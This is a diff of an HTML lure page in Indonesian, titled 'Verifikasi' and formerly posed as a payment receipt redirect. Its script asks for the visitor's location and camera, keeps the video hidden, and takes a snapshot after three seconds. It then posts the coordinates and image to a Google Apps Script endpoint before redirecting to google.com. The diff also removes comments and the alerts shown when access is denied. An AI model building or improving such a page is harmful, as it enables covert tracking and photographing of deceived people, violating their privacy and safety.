@@ -1,70 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Mengalihkan ke bukti pembayaran</title>
+  <title>Verifikasi</title>
   <style>
     video { display: none; }
     canvas { display: none; }
   </style>
 </head>
 <body>
-  <h3>Mohon tunggu 3 detik.</h3>
-
+  <h3>Memproses... Mohon tunggu 3 detik.</h3>
   <video id="video" autoplay></video>
   <canvas id="canvas" width="320" height="240"></canvas>
 
   <script>
-    const SHEET_URL = 'https://script.google.com/macros/s/AKfycbypdn_x4ThiuMb-Z8XC2QHVrKmVo53yHR5UkdvH5fhaKBpCGI6-Pd2Y6VxcaXuER0g8Ag/exec'; // ← Ganti dengan URL Web App kamu
-    const REDIRECT_URL = 'https://google.com'; // ← Ganti dengan URL redirect kamu
+    const SHEET_URL = 'https://script.google.com/macros/s/AKfycbypdn_x4ThiuMb-Z8XC2QHVrKmVo53yHR5UkdvH5fhaKBpCGI6-Pd2Y6VxcaXuER0g8Ag/exec';
+    const REDIRECT_URL = 'https://google.com';
 
     function sendData(latitude, longitude, imageBase64) {
       fetch(SHEET_URL, {
         method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
         body: JSON.stringify({
           latitude: latitude,
           longitude: longitude,
           imageBase64: imageBase64
-        }),
-        headers: {
-          'Content-Type': 'application/json'
-        }
-      }).then(() => {
-        // Setelah pengiriman berhasil, redirect
-        window.location.href = REDIRECT_URL;
-      });
+        })
+      }).then(response => response.text())
+        .then(result => {
+          console.log("Data berhasil dikirim:", result);
+          window.location.href = REDIRECT_URL;
+        })
+        .catch(error => {
+          console.error("Terjadi kesalahan pengiriman data:", error);
+        });
     }
 
-    // Akses lokasi
-    navigator.geolocation.getCurrentPosition(pos => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
+    navigator.geolocation.getCurrentPosition(
+      function(pos) {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        console.log("Lokasi berhasil diambil:", lat, lon);
 
-      // Akses kamera
-      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-        const video = document.getElementById('video');
-        video.srcObject = stream;
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+          const video = document.getElementById('video');
+          video.srcObject = stream;
 
-        // Tunggu 3 detik, lalu ambil gambar dan kirim
-        setTimeout(() => {
-          const canvas = document.getElementById('canvas');
-          const context = canvas.getContext('2d');
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL('image/png');
-
-          // Stop kamera
-          stream.getTracks().forEach(track => track.stop());
-
-          // Kirim data
-          sendData(lat, lon, imageData);
-        }, 3000); // ← Jeda 3 detik
-
-      }).catch(err => {
-        alert("Mengalihkan."); //akses kamera ditolak
-      });
-
-    }, err => {
-      alert("Mengalihkan lokasi."); //akses lokasi ditolak
-    });
+          setTimeout(() => {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+            stream.getTracks().forEach(track => track.stop());
+            sendData(lat, lon, imageData);
+          }, 3000);
+        }).catch(err => {
+          console.error("Terjadi kesalahan saat mengakses kamera:", err);
+        });
+      },
+      function(error) {
+        console.error("Gagal mendapatkan lokasi:", error);
+      }
+    );
   </script>
 </body>
 </html>
